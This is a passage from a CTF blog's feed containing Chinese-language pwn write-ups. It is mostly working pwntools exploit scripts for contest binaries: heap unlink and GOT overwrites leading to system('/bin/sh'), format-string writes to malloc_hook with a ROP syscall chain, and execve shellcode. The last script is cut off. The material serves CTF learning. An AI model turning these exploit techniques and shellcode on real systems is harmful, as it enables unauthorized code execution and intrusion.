class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"><span class="comment"># get fastbin#2 addr</span></div><div class="line">ruin(<span class="number">2</span>,<span class="string">"n"</span>)</div><div class="line">ruin(<span class="number">1</span>,<span class="string">"n"</span>)</div><div class="line">show(<span class="number">1</span>)</div><div class="line">ru(<span class="string">"salves: "</span>)</div><div class="line">fast_bin_addr  = u64(ru(<span class="string">"\n="</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"fast_bin_addr#0="</span>+hex(fast_bin_addr)</div><div class="line"></div><div class="line"><span class="comment"># heap_base addr</span></div><div class="line"></div><div class="line">heap_addr = fast_bin_addr-(fast_bin_addr &amp; <span class="number">0xfff</span>)</div><div class="line">fast_bin_addr_ptr = heap_addr+<span class="number">0x10</span>+<span class="number">0x20</span></div><div class="line"></div><div class="line"><span class="comment"># rebuild </span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># overwrite small chunk size  unlink prev_fast_chunk</span></div><div class="line"></div><div class="line">fake_chunk_head = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(fast_bin_addr_ptr<span class="number">-0x18</span>)+p64(fast_bin_addr_ptr<span class="number">-0x10</span>)</div><div class="line">payload = fake_chunk_head</div><div class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">"\x00"</span>)</div><div class="line">update_slaves(<span class="number">0</span>,payload+p64(<span class="number">0x40</span>)+chr(<span class="number">0xe0</span>+<span class="number">0x10</span>))</div><div class="line"><span class="comment"># unlink</span></div><div class="line">ruin(<span class="number">1</span>,<span class="string">"y"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40131D\nc")</span></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">update_slaves(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line">update_slaves(<span class="number">0</span>,p64(elf.symbols[<span class="string">"printf"</span>]))</div><div class="line"></div><div class="line"><span class="comment"># leak libc and calc system_addr</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x2</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(system_addr))</div><div class="line"><span class="comment"># exec /bin/sh</span></div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第三个漏洞"><a href="#第三个漏洞" class="headerlink" title="第三个漏洞"></a>第三个漏洞</h3><p>第三个漏洞非常简单，字符串数组空间大小为0x20，然而却给它赋于了0x28的大小用户输入，导致其溢出覆盖了下一个指针，从而引发任意地址写的利用，我们可以利用任意地址写，将atoi改成printf来泄漏system地址，然后将atoi改成system实现任意代码执行,exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 09:43:44</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">payload = p64(elf.symbols[<span class="string">"printf"</span>])+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">5</span>)</div><div class="line">ru(<span class="string">"y/n)\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"nd up with '\\n')\n"</span>)</div><div class="line"></div><div class="line">payload = p64(system_addr)+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># \n</span></div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;将atoi_got修改成printf_plt，威力无穷~&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;string overflow&lt;/li&gt;
&lt;li&gt;int overflow&lt;/li&gt;
&lt;li&gt;off by one&lt;/li&gt;
&lt;li&gt;race condition&lt;/li&gt;
&lt;li&gt;heap overlay &lt;/li&gt;
&lt;li&gt;fmt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="awd" scheme="https://winter3un.github.io/tags/awd/"/>
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>8月9日个人赛总结 &amp;&amp; writeup</title>
    <link href="https://winter3un.github.io/2017/08/10/2017-8-9/"/>
    <id>https://winter3un.github.io/2017/08/10/2017-8-9/</id>
    <published>2017-08-10T09:20:04.000Z</published>
    <updated>2018-06-15T08:42:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><p>对于zip压缩包，还是archpr好用。。</p><p>对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。</p><p>对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）</p><p>rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）</p><p>线下赛的web waf需要完善。</p><p>新的pyc加密方式  <code>stegosaurus</code></p><p>writeup 如下<br><a id="more"></a></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>打开文件。。发现又要压缩密码。。。ORZ</p><p>linux/x86下一段汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xor %eax, %eax</div><div class="line">xor %ebx, %ebx</div><div class="line">xor %ecx, %ecx</div><div class="line">push %ecx</div><div class="line">push $0x68732f2f</div><div class="line">push $0x6e69622f</div><div class="line">movl %esp,%ebx</div><div class="line">movb $11,%al</div><div class="line">int $0x80</div></pre></td></tr></table></figure></p><p>请将其提取为可用的shellcode,形式如\x01\x2d\x……的代码(字母小写)，shellcode的小写MD5<br>值为解压密码，上用pwntools的asm函数，将这些操作指令反汇编成机器码，如下</p><p><code>\x31\xc0\x31\xdb\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></p><p>然后再用题目提供的md5计算器计算下md5即可。</p><p><code>68f3e981152d37d372d732d0c3ee3977</code></p><p>接着常规套路，IDA打开分析一波，等等？？这pwn文件怎么那么熟悉= =。。  这不是全国大学生信安赛pwn3么，原题。。。虽然当时没做出来，但是后来看着别人的writeup复现了，exp还在本地，但是执行的时候，没有拿到shell，再看了下pwn文件，发现很多地址都有变动。</p><p>变动的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">stack_povit = 0x00000000004b93f8</div><div class="line">pop_rdi_ret = 0x00000000004005d5</div><div class="line">fake_fsp = 0x06CCC10</div><div class="line">malloc_hook = 0x6CB788</div><div class="line">read_buf = 0x400AEE</div></pre></td></tr></table></figure><p>具体的思路的话，还是利用格式化字符串的漏洞，修改malloc_hook的数据，让其在接受比较大的参数数据的时候执行malloc，比如”%100000c”,我们便可以控制执行流了。但是这边是静态编译，也不能狗利用one_gadget，很绝望，然而我们可以构造裸的rop来调用syscall（hhhhh），首先得找一个stack_povit，使我们的栈空间得到迁移，在这迁移的栈空间上构造我们的rop，然后触发ret，执行我们的rop，就拿到shell啦，下面是exp。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils,os,time</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.2.10"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># elf = ELF(target)</span></div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400B69\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">stack_povit = <span class="number">0x00000000004b93f8</span></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">fake_fsp = <span class="number">0x06CCC10</span></div><div class="line">malloc_hook = <span class="number">0x6CB788</span></div><div class="line">read_buf = <span class="number">0x400AEE</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># payload = 'A'*8+"%6$n\0"</span></div><div class="line">l = []</div><div class="line">l.append((stack_povit ) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((stack_povit &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((read_buf) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((read_buf &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>)</div><div class="line"></div><div class="line">payload = <span class="string">""</span></div><div class="line">delta = <span class="number">0</span></div><div class="line">printed = <span class="number">0</span></div><div class="line">index = <span class="number">6</span> + <span class="number">14</span> <span class="comment"># target addr</span></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> l:</div><div class="line">delta = (data-printed)&amp;<span class="number">0xffff</span></div><div class="line">payload +=  <span class="string">'%'</span>+str(delta)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(index)+<span class="string">'$hn'</span></div><div class="line">printed += delta</div><div class="line">index += <span class="number">1</span></div><div class="line"><span class="comment"># payload+=(len(payload)%8)*'A'</span></div><div class="line">payload +=<span class="string">"%"</span>+str(fake_fsp<span class="number">-0x20</span>)+<span class="string">"s"</span></div><div class="line">payload = payload.ljust(<span class="number">14</span>*<span class="number">8</span>,<span class="string">'a'</span>)</div><div class="line"></div><div class="line"><span class="comment"># target addr</span></div><div class="line">payload += p64(malloc_hook)</div><div class="line">payload += p64(malloc_hook+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp)</div><div class="line">payload += p64(fake_fsp+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">8</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0xa</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x10</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x12</span>)</div><div class="line"></div><div class="line"></div><div class="line">sl(payload)</div><div class="line"></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">pop_rdx_rsi_ret = <span class="number">0x0000000000442a99</span></div><div class="line">pop_rax_rdx_rbx_ret = <span class="number">0x0000000000479836</span></div><div class="line">syscall = <span class="number">0x4004ce</span></div><div class="line">rop = <span class="string">"aaaa\x17"</span></div><div class="line">rop += 